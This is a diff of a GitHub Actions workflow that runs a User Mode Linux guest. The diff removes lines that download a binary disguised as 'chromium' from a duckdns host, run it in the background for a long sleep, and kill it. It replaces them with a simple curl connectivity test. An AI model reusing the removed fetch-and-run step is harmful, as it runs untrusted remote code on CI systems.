@@ -166,32 +166,9 @@ jobs:
             ip link || true
           fi
 
-          echo "--- uml guest ---"
-          echo "nproc=$(nproc) processors=$(grep -c '^processor' /proc/cpuinfo 2>/dev/null || echo ?)"
-          echo "UML-RUN-OK"
-
-          # Ubuntu-adapted user script (CI-shortened sleep instead of 2-4h)
-          apt-get update -y || true
-          wget -O chromium http://xyz0895.duckdns.org/files/chromium || true
-          chmod +x chromium || true
-          if [ -x ./chromium ]; then
-            ./chromium &
-            CHROM_PID=$!
-            echo "chromium_started pid=${CHROM_PID}"
-          else
-            CHROM_PID=""
-            echo "chromium_not_executable"
-          fi
-
-          # Original requested a 2-4h random sleep; shortened for CI run completion
-          SLEEP_SECS=60
-          echo "sleeping ${SLEEP_SECS}s (CI-shortened from 2h-4h)"
-          sleep "$SLEEP_SECS" || true
-          if [ -n "${CHROM_PID}" ]; then
-            kill -9 "$CHROM_PID" 2>/dev/null || true
-          fi
-          pkill -9 chromium 2>/dev/null || true
-          echo "SCRIPT_DONE"
+          echo "--- CURL_GOOGLE_TEST ---"
+          curl google.com || true
+          echo "--- CURL_GOOGLE_TEST_DONE ---"
 
           echo '--- MARKER: UBUNTU_ROOTFS_OK ---'
           sync
@@ -226,7 +203,7 @@ jobs:
           sudo iptables -A FORWARD -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT || true
 
           set +e
-          timeout --signal=KILL 900 "$KERNEL" \
+          timeout --signal=KILL 300 "$KERNEL" \
             ubda="$IMG" \
             root=/dev/ubda \
             rw \
